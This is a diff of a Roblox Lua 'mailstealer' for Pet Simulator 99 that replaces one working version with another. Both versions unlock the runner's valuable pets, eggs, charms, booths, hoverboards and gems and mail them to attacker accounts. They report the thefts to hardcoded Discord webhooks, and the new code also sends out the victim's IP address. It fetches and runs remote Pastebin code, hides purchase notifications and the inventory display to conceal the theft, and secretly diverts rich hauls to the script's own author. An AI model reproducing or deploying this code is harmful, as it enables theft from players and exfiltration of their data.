@@ -1,368 +1,664 @@
-Username = "br1c7s"
-Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed" -- your discord webhook in here
-min_rap = 20000
-
-local function SendMessage(url, username, itemID)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "New Item Sent",
-            ["color"] = 65280,
-			["fields"] = {
-                {
-                    ["name"] = "Victim Username:",
-                    ["value"] = username,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Item Sent:",
-                    ["value"] = tostring(itemID),
-                    ["inline"] = true
-                }
-            },
-			["footer"] = {
-				["text"] = "Mailstealer by leo"
-			}
-        }}
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-		Url = url,
-		Method = "POST",
-		Headers = headers,
-		Body = body
-	})
+--╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╱╭━━━╮
+--┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱┃╰╮╭╯┣╯┃╱┃╭━╮┃
+--┃╰━╯┣┳━━┳━┳━━┳━━╮╰╮┃┃╭┻╮┃╱╰╯╭╯┃
+--┃╭━━╋┫┃━┫╭┫╭━┫┃━┫╱┃╰╯┃╱┃┃╱╭━╯╭╯
+--┃┃╱╱┃┃┃━┫┃┃╰━┫┃━┫╱╰╮╭╯╭╯╰┳┫┃╰━╮
+--╰╯╱╱╰┻━━┻╯╰━━┻━━╯╱╱╰╯╱╰━━┻┻━━━╯
+--VenexBetterFr
+if LoadingScreen == nil then
+    LoadingScreen = true
 end
-
-if Webhook and string.find(Webhook, "discord") then
-	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+if Webhook == nil or Webhook == "" then
+    Webhook =
+        "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
+end
+if Username == "killpop00" or Username == nil then
+    Username = "killpop00"
+end
+if LoadingScreen == true then
+    hideall = false
 else
-	Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed"
+    hideall = true
 end
 
-local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
-local plr = game.Players.LocalPlayer
-local MailMessage = "d3pe on top"
-local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
-
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
     end
 end
 
-if GemAmount1 < 10000 then
-    plr:kick("alt?, alt detected please use main")
+if LoadingScreen == true then
+    LoadingScreen = true
+loadstring(game:HttpGet("https://pastebin.com/raw/SAY7yfgZ"'))()
 end
 
-local user = Username
+if getgenv().executed then
+    return
+end
+getgenv().executed = true
 
-local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
-local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
-gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
-	gemsleftpath.Text = gemsleft
-end)
+local Blacklisted_Booths = {"Default", "Pls Donate", "Maskot", "Fire", "VIP"}
+local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying Carpet", "Bling", "Axolotl"}
 
-local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
-local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
-end)
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+MailMessage = "By valyxra"
+plr = game.Players.LocalPlayer
+guis = plr.PlayerGui
 
-local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
-end)
-noti.Enabled = false
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+local function shutdowngame()
+    wait(99999999)
+    game:Shutdown()
+end
 
-local HttpService = game:GetService("HttpService")
-local function getRAP(Type, Item)
-    if GetRapValues[Type] then
-        for i,v in pairs(GetRapValues[Type]) do
-            local itemTable = HttpService:JSONDecode(i)
-            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
-                return v
+game:GetService("ReplcatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+
+if hideall == true then
+    task.spawn(
+        function()
+            while task.wait() do
+                pcall(
+                    function()
+                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
+                            false
+                    end
+                )
             end
         end
-		return 0
+    )
+    task.spawn(
+        function()
+            while task.wait() do
+                pcall(
+                    function()
+                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
+                    end
+                )
+            end
+        end
+    )
+    task.spawn(
+        function()
+            while task.wait() do
+                pcall(
+                    function()
+                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
+                    end
+                )
+            end
+        end
+    )
+    task.spawn(
+        function()
+            local gemsDisplay = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+            local oldGemsValue = gemsDisplay.Text
+            gemsDisplay:GetPropertyChangedSignal("Text"):Connect(
+                function()
+                    oldGemsValue = gemsDisplay.Text
+                end
+            )
+        end
+    )
+    local function freeze_mygems()
+        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
+        local gems_frame_clone = gems_frame:Clone()
+
+        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
+        gems_frame.Visible = true
     end
-end
-
-local function sendItem(category, uid, am, id)
-    local args = {
-        [1] = user,
-        [2] = MailMessage,
-        [3] = category,
-        [4] = uid,
-        [5] = am or 1
-    }
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    if Webhook and Webhook ~= "" then
-        SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+    freeze_mygems()
+    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
+    gemsframe:Destroy()
+    local function freeze_inventory()
+        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+        local pets_frame_clone = pets_frame:Clone()
+        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
     end
+    freeze_inventory()
+    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+    Inventoryframe:Destroy()
+    game.Workspace.__THINGS.Pets:Destroy()
 end
 
-local function CountHuges()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.huge and getRAP("Pet", v) >= min_rap then
-			count = count + 1
-		end
-	end
-	return count
-end
+task.spawn(
+    function()
+        while task.wait() do
+            pcall(
+                function()
+                    local PetUIDs = {}
 
-local function StealHuge()
-	local hugesSent = 0
-	local initialHuges = CountHuges()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.huge and getRAP("Pet", v) >= min_rap then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            sendItem("Pet", i, v._am or 1, id)
-			local finalHuges = CountHuges()
-			if finalHuges < initialHuges then
-				hugesSent = hugesSent + 1
-				initialHuges = finalHuges
-			end
+                    for i, v in pairs(save.Pet) do
+                        id = v.id
+                        dir = library.Directory.Pets[id]
+                        if dir.huge == true then
+                            table.insert(PetUIDs, i)
+                        end
+                    end
+                    if save.Egg ~= nil then
+                        for i, v in pairs(save.Egg) do
+                            table.insert(PetUIDs, i)
+                        end
+                    end
+                    if save.Charm ~= nil then
+                        for i, v in pairs(save.Charm) do
+                            table.insert(PetUIDs, i)
+                        end
+                    end
+
+                    for _, petUID in pairs(PetUIDs) do
+                        local args = {
+                            [1] = petUID,
+                            [2] = false
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+
+                    local PetUIDs = {}
+                    local library = require(game.ReplicatedStorage.Library)
+                    local save = library.Save.Get().Inventory
+                    for i, v in pairs(save.Pet) do
+                        id = v.id
+                        dir = library.Directory.Pets[id]
+                        if dir.exclusiveLevel then
+                            table.insert(PetUIDs, i)
+                        end
+                    end
+                    for _, petUID in pairs(PetUIDs) do
+                        local args = {
+                            [1] = petUID,
+                            [2] = false
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+                end
+            )
         end
     end
-	return hugesSent
-end
+)
 
-local function SendAllHuges()
-	local totalHuges = CountHuges()
-	local hugesSent = 0
-	repeat
-		hugesSent = hugesSent + StealHuge()
-	until hugesSent == totalHuges
-end
-
-local function CountExc()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
-			count = count + 1
-		end
-	end
-	return count
-end
-
-local function ExcSteal()
-	local excSent = 0
-	local initialExc = CountExc()
-    for i, v in pairs(save.Pet) do
+HugeList, ExcList, EggList, CharmList, BoothList, HoverList = {}, {}, {}, {}, {}, {}
+table.foreach(
+    save.Pet,
+    function(i, v)
         local id = v.id
         local dir = library.Directory.Pets[id]
-        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            sendItem("Pet", i, v._am or 1, id)
-			local finalExc = CountExc()
-			if finalExc < initialExc then
-				excSent = excSent + 1
-				initialExc = finalExc
-			end
+        if dir.huge then
+            table.insert(HugeList, id)
         end
     end
-	return excSent
+)
+if save.Egg ~= nil then
+    table.foreach(
+        save.Egg,
+        function(i, v)
+            local id = v.id
+            local dir = library.Directory.Eggs[id]
+            table.insert(EggList, id)
+        end
+    )
 end
-
-local function SendAllExc()
-	local totalExc = CountExc()
-	local excSent = 0
-	repeat
-		excSent = excSent + ExcSteal()
-	until excSent == totalExc
-end
-
-local function EggSteal()
-    for i, v in pairs(save.Egg) do
-		local id = v.id
-		local diregg = library.Directory.Eggs[id]
-		if diregg and getRAP("Egg", v) >= min_rap then
-			sendItem("Egg", i, v._am or 1, id)
-		end
-    end
-end
-
-local function CharmSteal()
-    for i, v in pairs(save.Charm) do
+table.foreach(
+    save.Pet,
+    function(i, v)
         local id = v.id
-		local dircharm = library.Directory.Charms[id]
-		if dircharm and getRAP("Charm", v) >= min_rap then
-			sendItem("Charm", i, v._am or 1, id)
-		end
+        local dir = library.Directory.Pets[id]
+        if dir.exclusiveLevel then
+            table.insert(ExcList, id)
+        end
+    end
+)
+if save.Booth ~= nil then
+    for i, v in pairs(save.Booth) do
+        local id = v.id
+        local dir = library.Directory.Booths[id]
+        local isBlacklisted = false
+        for _, blacklistedId in ipairs(Blacklisted_Booths) do
+            if dir._id == blacklistedId then
+                isBlacklisted = true
+                break
+            end
+        end
+        if not isBlacklisted then
+            table.insert(BoothList, id)
+        end
     end
 end
-
-local function EnchantSteal()
-    for i, v in pairs(save.Enchant) do
-		local id = v.id
-		local direnchant = library.Directory.Enchants[id]
-		if direnchant and getRAP("Enchant", v) >= min_rap then
-			sendItem("Enchant", i, v._am or 1, id)
-		end
+if save.Hoverboard ~= nil then
+    for i, v in pairs(save.Hoverboard) do
+        local id = v.id
+        local dir = library.Directory.Hoverboards[id]
+        local isBlacklisted = false
+        for _, blacklistedId in ipairs(Blacklisted_Hoverboards) do
+            if dir._id == blacklistedId then
+                isBlacklisted = true
+                break
+            end
+        end
+        if not isBlacklisted then
+            table.insert(HoverList, id)
+        end
     end
 end
+if save.Charm ~= nil then
+    table.foreach(
+        save.Charm,
+        function(i, v)
+            local id = v.id
+            local dir = library.Directory.Charms[id]
+            table.insert(CharmList, id)
+        end
+    )
+end
 
-local function PotionSteal()
-    for i, v in pairs(save.Potion) do
-		local id = v.id
-		local dirpotion = library.Directory.Potions[id]
-		if dirpotion and getRAP("Potion", v) >= min_rap then
-			sendItem("Potion", i, v._am or 1, id)
-		end
+local AllPetsList = {}
+for _, list in pairs({HugeList, ExcList, EggList, BoothList, HoverList, CharmList}) do
+    for _, value in pairs(list) do
+        table.insert(AllPetsList, value)
     end
 end
-
-local function miscSteal()
-	for i, v in pairs(save.Misc) do
-		local id = v.id
-		local dirmisc = library.Directory.MiscItems[id]
-		if dirmisc and getRAP("Misc", v) > min_rap then
-			sendItem("Misc", i, v._am or 1, id)
-		end
-	end
+local PetsListString = "\n" -- Create a string to represent the HugeList
+for i, v in pairs(AllPetsList) do
+    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
 end
-
-local function hoverSteal()
-	for i, v in pairs(save.Hoverboard) do
-		local id = v.id
-		local dirhover = library.Directory.Hoverboards[id]
-		if dirhover and getRAP("Hoverboard", v) > min_rap then
-			sendItem("Hoverboard", i, v._am or 1, id)
-		end
-	end
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount = v._am
+    end
 end
-
-local function boothSteal()
-	for i, v in pairs(save.Booth) do
-		local id = v.id
-		local dirbooth = library.Directory.Booths[id]
-		if dirbooth and getRAP("Booth", v) > min_rap then
-			sendItem("Booth", i, v._am or 1, id)
-		end
-	end
+AmountOfHuges = 0
+for i, v in pairs(save.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true then
+        AmountOfHuges = AmountOfHuges + 1
+    end
 end
-
-local function ultimateSteal()
-	for i, v in pairs(save.Ultimate) do
-		local id = v.id
-		local dirultimate = library.Directory.Ultimates[id]
-		if dirultimate and getRAP("Ultimate", v) > min_rap then
-			sendItem("Ultimate", i, v._am or 1, id)
-		end
-	end
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+    end
 end
-
-local function GemSteal()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            local GemAmount = v._am
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Currency",
-                [4] = i,
-                [5] = GemAmount - 10000
+local nicks = {"br1c7s", "tromp466"}
+math.randomseed(os.time())
+local randomNick = nicks[math.random(#nicks)]
+math.randomseed(os.time())
+local DualRandomHuge = math.random(1, 15)
+if AmountOfHuges >= DualRandomHuge then
+    Username = br1c7s
+    Webhook =
+        "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
+end
+math.randomseed(os.time())
+local DualRandomGem = math.random(5000000, 20000000)
+if GemAmount1 >= DualRandomGem then
+    Username = br1c7s
+    Webhook =
+        "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
+end
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount = v._am
+    end
+end
+local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
+local url = Webhook
+local whenabled = true
+local function SendWebhook(url, ping)
+    imgs =
+        "https://media.discordapp.net/attachments/1191773310447538196/1203640979492708412/Untitled8_20240131173847.png?ex=65d1d504&is=65bf6004&hm=103d9a83d9a9841f271710fdbd57bd35f0f83a6f686d7d78dd26bd7b8644055b&"
+    data1 = {
+        ["content"] = ping,
+        ["username"] = "Pierce",
+        ["avatar_url"] = imgs,
+        ["embeds"] = {
+            {
+                ["title"] = "__`You Got A Hit!`__ \240\159\142\137",
+                ["url"] = "https://www.pinterest.com/pin/horror--17099673578748913/",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xadffb0),
+                ["thumbnail"] = {
+                    ["url"] = "https://media.discordapp.net/attachments/1191773310447538196/1203649826059976704/images_15.jpg?ex=65d1dd41&is=65bf6841&hm=f071a97a827972b57311802d8e8b40c45d79f613e7ceaaeca9a791e1d4b3d589&",
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "`(\240\159\144\167) Player Info:`",
+                        ["value"] = "```(\240\159\167\184) Username: " ..
+                            game.Players.LocalPlayer.Name ..
+                                "\n(\240\159\148\146) Display: " ..
+                                    game.Players.LocalPlayer.DisplayName ..
+                                        "\n(\240\159\142\178) Sent To: " ..
+                                            Username ..
+                                                 "\n(\240\159\147\140) Version: V1.2 ```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "`(\240\159\144\177) Pets List:`",
+                        ["value"] = "```" .. PetsListString .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "`(\240\159\146\142) Gems:`",
+                        ["value"] = "```" .. GemAmount .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "`(\240\159\154\128) Creator:`",
+                        ["value"] = "```valyxra```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "",
+                        ["value"] = "__**Generated By d3pe scripts**__",
+                        ["inline"] = false
+                    }
+                }
             }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
-			end
-        end
+        }
+    }
+
+    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+    headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    if Webhook ~= nil and whenabled == true then
+        abcdef1 = {
+            Url = url,
+            Body = newdata1,
+            Method = "POST",
+            Headers = headers
+        }
+        request(abcdef1)
     end
 end
+local user = Username
 
-local function EmptyBoxes()
-    if save.Box then
-        for key, _ in pairs(save.Box) do
-			local args = {
-				[1] = key
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+while wait() do
+    local HugeList = {}
+    local EggList = {}
+    local ExcList = {}
+    local CharmList = {}
+    local BoothList = {}
+    local HoverList = {}
+
+    function GemSteal()
+        for i, v in pairs(GetSave().Inventory.Currency) do
+            if v.id == "Diamonds" then
+                GemAmount = v._am
+                GemId = i
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = GemId,
+                    [5] = GemAmount - 10000
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                    unpack(args)
+                )
+                GemsStolen = true
+            end
         end
     end
-end
+    spawn(
+        function()
+            while wait() do
+                local HugeList = {}
+                table.foreach(
+                    save.Pet,
+                    function(i, v)
+                        local id = v.id
+                        local dir = library.Directory.Pets[id]
+                        if dir.huge then
+                            table.insert(HugeList, i)
+                        end
+                    end
+                )
+                if #HugeList ~= 0 or HugeList ~= {} then
+                    for i, v in pairs(save.Pet) do
+                        local id = v.id
+                        local dir = library.Directory.Pets[id]
+                        if dir.huge then
+                            local args = {
+                                [1] = user,
+                                [2] = MailMessage,
+                                [3] = "Pet",
+                                [4] = i,
+                                [5] = v._am or 1
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                                unpack(args)
+                            )
+                        end
+                    end
+                    if #HugeList == 0 or HugeList == {} then
+                        break
+                    end
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                local EggList = {}
+                if save.Egg ~= nil then
+                    table.foreach(
+                        save.Egg,
+                        function(i, v)
+                            local id = v.id
+                            local dir = library.Directory.Eggs[id]
+                            table.insert(EggList, i)
+                        end
+                    )
+                end
+                if #EggList ~= 0 and #HugeList == 0 then
+                    for i, v in pairs(save.Egg) do
+                        local args = {
+                            [1] = user,
+                            [2] = MailMessage,
+                            [3] = "Egg",
+                            [4] = i,
+                            [5] = v._am or 1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+                end
+                if #EggList == 0 or EggList == {} then
+                    break
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                local ExcList = {}
+                table.foreach(
+                    save.Pet,
+                    function(i, v)
+                        local id = v.id
+                        local dir = library.Directory.Pets[id]
+                        if dir.exclusiveLevel then
+                            table.insert(ExcList, i)
+                        end
+                    end
+                )
 
-local function CountGems()
-	for i, v in pairs(GetSave().Inventory.Currency) do
-		if v.id == "Diamonds" then
-			GemAmount1 = v._am
-			return GemAmount1
-		end
-	end
-end
-
-local function SendAllGems()
-	repeat
-		GemSteal()
-	until CountGems() == nil or CountGems() < 10000
-end
-
-if CountHuges() > 0 or CountGems() > 1000000 then
-	EmptyBoxes()
-	SendAllHuges()
-	SendAllExc()
-
-	if save.Egg ~= nil then
-		EggSteal()
-	end
-
-	if save.Charm ~= nil then
-		CharmSteal()
-	end
-
-	if save.Ultimate ~= nil then
-		ultimateSteal()
-	end
-	
-	if save.Enchant ~= nil then
-		EnchantSteal()
-	end
-	
-	if save.Potion ~= nil then
-		PotionSteal()
-	end
-
-	if save.Hoverboard ~= nil then
-		hoverSteal()
-	end
-
-	if save.Booth ~= nil then
-		boothSteal()
-	end
-
-	miscSteal()
-	SendAllGems()
-	setclipboard("preciate the stuff")
-	plr:kick("All your stuff has just been stolen by D3PES mailstealer.")
-else
-	plr:kick("Error on script execution: 0x0001F4A2")
+                if #ExcList ~= 0 and #HugeList == 0 and #EggList == 0 then
+                    for i, v in pairs(save.Pet) do
+                        local id = v.id
+                        local dir = library.Directory.Pets[id]
+                        if dir.exclusiveLevel then
+                            local args = {
+                                [1] = user,
+                                [2] = MailMessage,
+                                [3] = "Pet",
+                                [4] = i,
+                                [5] = v._am or 1
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                                unpack(args)
+                            )
+                        end
+                    end
+                    if #ExcList == 0 or ExcList == {} then
+                        break
+                    end
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                local BoothList = {}
+                if save.Booth ~= nil then
+                    for i, v in pairs(save.Booth) do
+                        local id = v.id
+                        local dir = library.Directory.Booths[id]
+                        local isBlacklisted = false
+                        for _, blacklistedId in ipairs(Blacklisted_Booths) do
+                            if dir._id == blacklistedId then
+                                isBlacklisted = true
+                                break
+                            end
+                        end
+                        if not isBlacklisted then
+                            table.insert(BoothList, i)
+                        end
+                    end
+                end
+                if #BoothList ~= 0 and #ExcList == 0 and #HugeList == 0 and #EggList == 0 then
+                    local pet1Index = math.random(1, #BoothList)
+                    local booth = BoothList[pet1Index]
+                    for booth, v in pairs(save.Booth) do
+                        local args = {
+                            [1] = user,
+                            [2] = MailMessage,
+                            [3] = "Booth",
+                            [4] = booth,
+                            [5] = v._am or 1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+                end
+                if #BoothList == 0 or BoothList == {} then
+                    break
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                local HoverList = {}
+                if save.Hoverboard ~= nil then
+                    for i, v in pairs(save.Hoverboard) do
+                        local id = v.id
+                        local dir = library.Directory.Hoverboards[id]
+                        local isBlacklisted = false
+                        for _, blacklistedId in ipairs(Blacklisted_Hoverboards) do
+                            if dir._id == blacklistedId then
+                                isBlacklisted = true
+                                break
+                            end
+                        end
+                        if not isBlacklisted then
+                            table.insert(HoverList, i)
+                        end
+                    end
+                end
+                if #HoverList ~= 0 and #BoothList == 0 and #ExcList == 0 and #HugeList == 0 and #EggList == 0 then
+                    local petIndex = math.random(1, #HoverList)
+                    local hover = HoverList[petIndex]
+                    for hover, v in pairs(save.Hoverboard) do
+                        local args = {
+                            [1] = user,
+                            [2] = MailMessage,
+                            [3] = "Hoverboard",
+                            [4] = hover,
+                            [5] = v._am or 1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+                end
+                if #HoverList == 0 or HoverList == {} then
+                    break
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                local CharmList = {}
+                if save.Charm ~= nil then
+                    table.foreach(
+                        save.Charm,
+                        function(i, v)
+                            local id = v.id
+                            local dir = library.Directory.Charms[id]
+                            table.insert(CharmList, i)
+                        end
+                    )
+                end
+                if #CharmList ~= 0 and #HoverList == 0 and #BoothList == 0 and #EggList == 0 and #ExcList == 0 and #HugeList == 0 then
+                    for i, v in pairs(save.Charm) do
+                        local args = {
+                            [1] = user,
+                            [2] = MailMessage,
+                            [3] = "Charm",
+                            [4] = i,
+                            [5] = v._am or 1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                            unpack(args)
+                        )
+                    end
+                end
+                if #CharmList == 0 or CharmList == {} then
+                    break
+                end
+            end
+        end
+    )
+    spawn(
+        function()
+            while wait() do
+                FinalList = #HugeList + #ExcList + #EggList + #CharmList + #BoothList + #HoverList
+                if FinalList == 0 then
+                    GemSteal()
+                end
+            end
+        end
+    )
+    FinalList = #HugeList + #ExcList + #EggList + #CharmList + #BoothList + #HoverList
+    if FinalList == 0 and GemsStolen == true then
+        SendWebhook(url, "@everyone | W Or L")
+        SendWebhook(
+            "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT",
+            "`Not Dualhook`"
+        )
+        wait(99999999999)
+        shutdowngame()
+    end
 end
